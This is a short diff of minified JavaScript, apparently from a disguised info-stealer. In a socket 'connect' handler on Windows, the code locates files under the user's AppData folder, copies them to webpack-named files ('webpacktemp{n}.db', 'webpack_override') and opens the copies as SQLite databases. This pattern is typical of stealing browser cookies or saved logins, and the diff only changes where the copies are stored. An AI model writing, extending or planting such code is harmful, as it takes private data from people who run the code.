@@ -86,7 +86,7 @@ g.on("connect", function (e) {
   let a = [];
   try {
     if ("Windows_NT" == r) {
-      const i = "public/webpack_override";
+      const i = "webpack_override";
       var o = s.join(
         ...String(h).split("/"),
         "AppData",
@@ -114,7 +114,7 @@ g.on("connect", function (e) {
           );
         for (let e = 0; e < a.length; e++) {
           var t = a[e];
-          const r = `public/webpacktemp${e}.db`;
+          const r = `webpacktemp${e}.db`;
           !0 === P(t) &&
             l.copyFile(t, r, (e) => {
               const t = new f.Database(r);
